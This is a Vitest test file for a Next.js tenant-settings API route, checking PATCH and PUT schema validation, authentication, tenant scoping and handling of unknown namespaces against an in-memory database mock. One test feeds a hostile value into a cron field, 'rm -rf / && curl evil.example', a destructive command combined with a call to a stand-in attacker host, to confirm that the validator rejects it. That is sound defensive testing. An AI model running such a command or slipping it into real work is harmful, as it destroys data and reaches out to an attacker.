/**
 * Tests for the shared namespace CRUD route.
 *
 * PATCH is a shallow merge that must honour the same namespace schema contract
 * as PUT. A partial write that violates the schema has to be rejected with 422
 * and leave the stored value untouched — otherwise an unvalidated jurisdiction
 * (or any other schema-governed field) reaches the compliance gate, which falls
 * back to the most restrictive case and silently blocks the tenant.
 *
 * Uses an in-memory D1 mock — no real DB required.
 *
 * @module app/api/v1/settings/[namespace]/route.test
 */

import { beforeEach, describe, expect, it, vi } from 'vitest';
import { NextRequest } from 'next/server';
import type { RouteCtx } from './namespace-route-helpers';

const { mockGetCurrentUser } = vi.hoisted(() => ({
  mockGetCurrentUser: vi.fn(),
}));

vi.mock('@/forest/middleware/rate-limit-wrapper', () => ({
  withRateLimit: (handler: (req: NextRequest) => Promise<Response>) => {
    return (req: NextRequest) => handler(req);
  },
}));

vi.mock('@/seed/auth/better-auth-session', () => ({
  getCurrentUserFromHeaders: mockGetCurrentUser,
}));

// ---------- in-memory D1 mock ----------

type Row = {
  id: string;
  tenant_id: string;
  namespace: string;
  value: string;
  schema_version: number;
  created_at: string;
  updated_at: string;
};

function makeD1Mock(): { db: D1Database; store: Map<string, Row> } {
  const store = new Map<string, Row>();
  const key = (tenant: string, namespace: string) => `${tenant}::${namespace}`;

  const db = {
    prepare: (sql: string) => {
      const stmt = {
        _sql: sql.trim(),
        _binds: [] as unknown[],
        bind: (...args: unknown[]) => {
          stmt._binds = args;
          return stmt;
        },
        run: async () => {
          if (stmt._sql.startsWith('INSERT INTO tenant_settings')) {
            const [id, tenantId, namespace, value, , createdAt, updatedAt] =
              stmt._binds as string[];
            const k = key(tenantId, namespace);
            const existing = store.get(k);
            store.set(k, {
              id,
              tenant_id: tenantId,
              namespace,
              value,
              schema_version: 1,
              created_at: existing?.created_at ?? createdAt,
              updated_at: updatedAt,
            });
          }
          return { success: true, meta: { changes: 1 } };
        },
        first: async <T>() => {
          if (stmt._sql.includes('WHERE tenant_id = ? AND namespace = ?')) {
            const [tenantId, namespace] = stmt._binds as string[];
            const row = store.get(key(tenantId, namespace));
            if (!row) return null;
            return { value: row.value } as T;
          }
          return null;
        },
        all: async () => ({ results: [] }),
      };
      return stmt;
    },
    exec: vi.fn(),
    batch: vi.fn(),
    dump: vi.fn(),
  } as unknown as D1Database;

  return { db, store };
}

const { db, store } = makeD1Mock();
(globalThis as unknown as Record<string, unknown>).__env = { DB: db };

const { PUT, PATCH } = await import('./route');

function writeRequest(
  method: 'PUT' | 'PATCH',
  namespace: string,
  body: unknown,
): { req: NextRequest; ctx: RouteCtx } {
  return {
    req: new NextRequest(`http://localhost/api/v1/settings/${namespace}`, {
      method,
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    }),
    ctx: { params: Promise.resolve({ namespace }) },
  };
}

function readStored(tenantId: string, namespace: string): Record<string, unknown> {
  const row = store.get(`${tenantId}::${namespace}`);
  return row ? (JSON.parse(row.value) as Record<string, unknown>) : {};
}

function seedStored(tenantId: string, namespace: string, value: Record<string, unknown>): void {
  store.set(`${tenantId}::${namespace}`, {
    id: 'ts_seed',
    tenant_id: tenantId,
    namespace,
    value: JSON.stringify(value),
    schema_version: 1,
    created_at: '2026-10-21T00:00:00.000Z',
    updated_at: '2026-10-21T00:00:00.000Z',
  });
}

describe('PATCH /api/v1/settings/[namespace]', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    store.clear();
    mockGetCurrentUser.mockResolvedValue({ id: 'tenant-1' });
  });

  it('returns 401 when the caller has no session', async () => {
    mockGetCurrentUser.mockResolvedValue(null);

    const { req, ctx } = writeRequest('PATCH', 'geo', { targetJurisdiction: 'US' });
    const res = await PATCH(req, ctx);

    expect(res.status).toBe(401);
    expect(store.size).toBe(0);
  });

  it('rejects a malformed jurisdiction with 422 and writes nothing', async () => {
    const { req, ctx } = writeRequest('PATCH', 'geo', { targetJurisdiction: 'USA' });
    const res = await PATCH(req, ctx);

    expect(res.status).toBe(422);
    expect(store.size).toBe(0);
  });

  it('rejects a schema-violating value even when the namespace row already exists', async () => {
    seedStored('tenant-1', 'geo', {
      targetJurisdiction: 'VN',
      additionalRules: [],
      removedRules: [],
    });

    const { req, ctx } = writeRequest('PATCH', 'geo', { targetJurisdiction: 'USA' });
    const res = await PATCH(req, ctx);

    expect(res.status).toBe(422);
    expect(readStored('tenant-1', 'geo')).toEqual({
      targetJurisdiction: 'VN',
      additionalRules: [],
      removedRules: [],
    });
  });

  it('rejects a schema-violating partial without dropping the other stored fields', async () => {
    seedStored('tenant-1', 'geo', {
      targetJurisdiction: 'VN',
      additionalRules: [{ category: 'crypto', blockedCountries: ['CN'], reason: 'tenant rule' }],
      removedRules: [{ category: 'gambling', country: 'US' }],
    });

    const { req, ctx } = writeRequest('PATCH', 'geo', { targetJurisdiction: 'United States' });
    const res = await PATCH(req, ctx);

    expect(res.status).toBe(422);
    expect(readStored('tenant-1', 'geo')).toEqual({
      targetJurisdiction: 'VN',
      additionalRules: [{ category: 'crypto', blockedCountries: ['CN'], reason: 'tenant rule' }],
      removedRules: [{ category: 'gambling', country: 'US' }],
    });
  });

  it('rejects a non-string jurisdiction with 422 and leaves the store unchanged', async () => {
    seedStored('tenant-1', 'geo', { targetJurisdiction: 'VN' });

    const { req, ctx } = writeRequest('PATCH', 'geo', { targetJurisdiction: 42 });
    const res = await PATCH(req, ctx);

    expect(res.status).toBe(422);
    expect(readStored('tenant-1', 'geo')).toEqual({ targetJurisdiction: 'VN' });
  });

  it('rejects a malformed cron expression for the namespace with 422 without persisting', async () => {
    seedStored('tenant-1', 'cron', {
      affiliateScoutCadenceHours: 24,
      contentProducerCron: '0 */6 * * *',
      enabled: { affiliateScout: true, contentProducer: true },
    });

    const { req, ctx } = writeRequest('PATCH', 'cron', {
      contentProducerCron: 'rm -rf / && curl evil.example',
    });
    const res = await PATCH(req, ctx);

    expect(res.status).toBe(422);
    expect(readStored('tenant-1', 'cron').contentProducerCron).toBe('0 */6 * * *');
  });

  it('persists a valid partial merge', async () => {
    seedStored('tenant-1', 'geo', {
      targetJurisdiction: 'VN',
      additionalRules: [{ category: 'crypto', blockedCountries: ['CN'] }],
    });

    const { req, ctx } = writeRequest('PATCH', 'geo', { targetJurisdiction: 'EU' });
    const res = await PATCH(req, ctx);

    expect(res.status).toBe(200);
    const json = (await res.json()) as { namespace: string; value: Record<string, unknown> };
    expect(json.namespace).toBe('geo');
    expect(json.value.targetJurisdiction).toBe('EU');
    const stored = readStored('tenant-1', 'geo');
    expect(stored.targetJurisdiction).toBe('EU');
    // Untouched keys survive the merge.
    expect(stored.additionalRules).toEqual([{ category: 'crypto', blockedCountries: ['CN'] }]);
  });

  it('accepts EU as a bloc code', async () => {
    const { req, ctx } = writeRequest('PATCH', 'geo', { targetJurisdiction: 'EU' });
    const res = await PATCH(req, ctx);

    expect(res.status).toBe(200);
    expect(readStored('tenant-1', 'geo').targetJurisdiction).toBe('EU');
  });

  it('rejects a body that is not a plain object with 400', async () => {
    const { req, ctx } = writeRequest('PATCH', 'geo', ['targetJurisdiction']);
    const res = await PATCH(req, ctx);

    expect(res.status).toBe(400);
    expect(store.size).toBe(0);
  });

  it('scopes the write to the authenticated tenant only', async () => {
    seedStored('tenant-2', 'geo', { targetJurisdiction: 'RU' });

    const { req, ctx } = writeRequest('PATCH', 'geo', { targetJurisdiction: 'US' });
    const res = await PATCH(req, ctx);

    expect(res.status).toBe(200);
    expect(readStored('tenant-2', 'geo').targetJurisdiction).toBe('RU');
  });
});

describe('PUT /api/v1/settings/[namespace]', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    store.clear();
    mockGetCurrentUser.mockResolvedValue({ id: 'tenant-1' });
  });

  it('persists a valid replacement', async () => {
    const { req, ctx } = writeRequest('PUT', 'geo', { targetJurisdiction: 'US' });
    const res = await PUT(req, ctx);

    expect(res.status).toBe(200);
    expect(readStored('tenant-1', 'geo').targetJurisdiction).toBe('US');
  });

  it('rejects a malformed value with 422 and writes nothing', async () => {
    const { req, ctx } = writeRequest('PUT', 'geo', { targetJurisdiction: 'USA' });
    const res = await PUT(req, ctx);

    expect(res.status).toBe(422);
    expect(store.size).toBe(0);
  });
});

describe('namespace resolution', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    store.clear();
    mockGetCurrentUser.mockResolvedValue({ id: 'tenant-1' });
  });

  it('returns 404 for PATCH on an unknown namespace', async () => {
    const { req, ctx } = writeRequest('PATCH', 'not-a-namespace', { anything: 1 });
    const res = await PATCH(req, ctx);

    expect(res.status).toBe(404);
    expect(store.size).toBe(0);
  });

  it('returns 404 for PUT on an unknown namespace', async () => {
    const { req, ctx } = writeRequest('PUT', 'not-a-namespace', { anything: 1 });
    const res = await PUT(req, ctx);

    expect(res.status).toBe(404);
    expect(store.size).toBe(0);
  });
});
